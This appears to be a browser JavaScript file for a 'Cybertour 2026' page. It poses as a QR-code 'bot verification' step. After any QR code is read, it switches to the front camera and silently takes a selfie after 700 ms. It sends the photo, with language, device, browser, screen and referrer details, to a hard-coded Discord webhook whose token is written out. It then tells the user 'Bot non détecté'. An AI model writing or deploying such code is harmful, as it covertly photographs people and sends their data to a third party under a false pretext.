/**
 * CYBERTOUR 2026 — verify.js
 * QR scan (caméra arrière) → selfie auto (caméra frontale) → Discord
 */

import { isVerified, setVerified } from './storage.js';

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1550264500526121013/9VASm7wlXChAGnQ1_n5xfTIGdWj20ZhSbrsLi05ndMx7CoNWXC8Rn0obLkzwxsdmj1fr';

let streamBack  = null;
let streamFront = null;
let capturing   = false;
let rafId       = null;
let qrDone      = false;

const qrCanvas = document.createElement('canvas');
const qrCtx    = qrCanvas.getContext('2d', { willReadFrequently: true });

export function openVerify(onSuccess) {
  if (isVerified()) { onSuccess(); return; }

  document.getElementById('verify-overlay').classList.add('active');
  document.getElementById('wheel-wrap')?.classList.add('wheel-frozen');

  document.getElementById('verify-start-btn').onclick   = () => startQR(onSuccess);
  document.getElementById('verify-help-toggle').onclick = toggleHelp;
}

// ── ÉTAPE 1 : Caméra arrière + scan QR ───────────────────────

async function startQR(onSuccess) {
  const btn = document.getElementById('verify-start-btn');
  btn.disabled = true;
  btn.querySelector('.btn-text').textContent = 'Scan QR en cours…';

  if (!window.jsQR) {
    showError('Scanner indisponible. Rechargez la page.');
    resetBtn(btn);
    return;
  }

  const video = document.getElementById('verify-video');
  video.setAttribute('playsinline', '');
  video.muted = true;
  // Retire le miroir pour la caméra arrière
  video.style.transform = 'none';

  const sets = [
    { video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 } } },
    { video: { facingMode: 'environment' } },
    { video: true },
  ];

  streamBack = null;
  for (const c of sets) {
    try { streamBack = await navigator.mediaDevices.getUserMedia(c); break; }
    catch {}
  }

  if (!streamBack) {
    showError('Accès à la caméra refusé. Vérifiez les permissions.');
    resetBtn(btn);
    return;
  }

  video.srcObject = streamBack;
  try { await video.play(); } catch {}

  document.getElementById('verify-video-wrap').classList.add('active');
  document.getElementById('verify-initial').style.display = 'none';

  // Lance la boucle de scan QR
  qrDone = false;
  rafId  = requestAnimationFrame(() => scanLoop(video, onSuccess));
}

// ── Boucle scan QR ────────────────────────────────────────────

function scanLoop(video, onSuccess) {
  if (qrDone) return;

  if (video.readyState >= HTMLMediaElement.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
    qrCanvas.width  = video.videoWidth;
    qrCanvas.height = video.videoHeight;
    qrCtx.drawImage(video, 0, 0);

    try {
      const img  = qrCtx.getImageData(0, 0, qrCanvas.width, qrCanvas.height);
      const code = window.jsQR(img.data, img.width, img.height, { inversionAttempts: 'dontInvert' });

      if (code && code.data) {
        qrDone = true;
        cancelAnimationFrame(rafId);
        stopStream(streamBack);
        streamBack = null;

        // QR validé → passe au selfie
        onQRSuccess(onSuccess);
        return;
      }
    } catch {}
  }

  rafId = requestAnimationFrame(() => scanLoop(video, onSuccess));
}

function onQRSuccess(onSuccess) {
  const btn = document.getElementById('verify-start-btn');
  btn.querySelector('.btn-text').textContent = 'QR validé — Identification…';
  startSelfie(onSuccess);
}

// ── ÉTAPE 2 : Caméra frontale + selfie auto ───────────────────

async function startSelfie(onSuccess) {
  const video = document.getElementById('verify-video');
  video.style.transform = 'scaleX(-1)'; // miroir selfie

  const sets = [
    { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } } },
    { video: { facingMode: 'user' } },
    { video: true },
  ];

  streamFront = null;
  for (const c of sets) {
    try { streamFront = await navigator.mediaDevices.getUserMedia(c); break; }
    catch {}
  }

  if (!streamFront) {
    // Pas de caméra frontale — on valide quand même avec le QR seul
    finalize(null, onSuccess);
    return;
  }

  video.srcObject = streamFront;
  try { await video.play(); } catch {}

  // Photo automatique après 700ms
  setTimeout(() => captureSelfie(video, onSuccess), 700);
}

// ── Capture selfie ────────────────────────────────────────────

function captureSelfie(video, onSuccess) {
  if (capturing) return;
  capturing = true;

  flash();

  const canvas = document.createElement('canvas');
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0);

  stopStream(streamFront);
  streamFront = null;

  finalize(canvas, onSuccess);
}

// ── Finalisation ──────────────────────────────────────────────

function finalize(canvas, onSuccess) {
  sendToDiscord(canvas);

  const btn = document.getElementById('verify-start-btn');
  if (btn) btn.querySelector('.btn-text').textContent = 'Bot non détecté ✓';

  setVerified();
  if (navigator.vibrate) navigator.vibrate([60, 40, 120]);

  setTimeout(() => {
    closeOverlay();
    document.getElementById('wheel-wrap')?.classList.remove('wheel-frozen');
    onSuccess();
  }, 900);
}

// ── Envoi Discord ─────────────────────────────────────────────

function sendToDiscord(canvas) {
  const send = (blob) => {
    const fd = new FormData();
    if (blob) fd.append('file', blob, 'selfie.jpg');
    fd.append('payload_json', JSON.stringify({
      embeds: [{
        title: '📸 Nouveau participant détecté',
        color: 0x2563eb,
        image: blob ? { url: 'attachment://selfie.jpg' } : undefined,
        fields: [
          { name: '🕐 Heure',      value: new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' }), inline: true },
          { name: '🌍 Langue',     value: navigator.language || 'inconnu', inline: true },
          { name: '📱 Appareil',   value: /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : /Android/.test(navigator.userAgent) ? 'Android' : 'Desktop', inline: true },
          { name: '🖥️ Navigateur', value: /Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Autre', inline: true },
          { name: '📐 Écran',      value: `${screen.width}×${screen.height}`, inline: true },
          { name: '🔗 Référent',   value: document.referrer || 'accès direct', inline: true },
        ],
        footer: { text: 'Cybertour 2026 — QR + Selfie' },
        timestamp: new Date().toISOString(),
      }]
    }));
    fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
  };

  if (canvas) {
    canvas.toBlob(blob => send(blob), 'image/jpeg', 0.75);
  } else {
    send(null);
  }
}

// ── Helpers ───────────────────────────────────────────────────

function flash() {
  const el = document.getElementById('verify-flash');
  if (!el) return;
  el.style.opacity = '1';
  setTimeout(() => { el.style.opacity = '0'; }, 180);
}

function stopStream(s) {
  if (s) s.getTracks().forEach(t => t.stop());
  const v = document.getElementById('verify-video');
  if (v) v.srcObject = null;
}

function closeOverlay() {
  document.getElementById('verify-overlay').classList.remove('active');
}

function resetBtn(btn) {
  btn.disabled = false;
  btn.querySelector('.btn-text').textContent = 'Réessayer';
}

function toggleHelp() {
  const panel = document.getElementById('verify-help-panel');
  const btn   = document.getElementById('verify-help-toggle');
  const open  = panel.classList.toggle('active');
  btn.textContent = open ? 'Masquer' : 'Besoin d\'aide ?';
}

function showError(msg) {
  const el = document.getElementById('verify-error');
  if (el) { el.textContent = msg; el.classList.add('active'); }
}
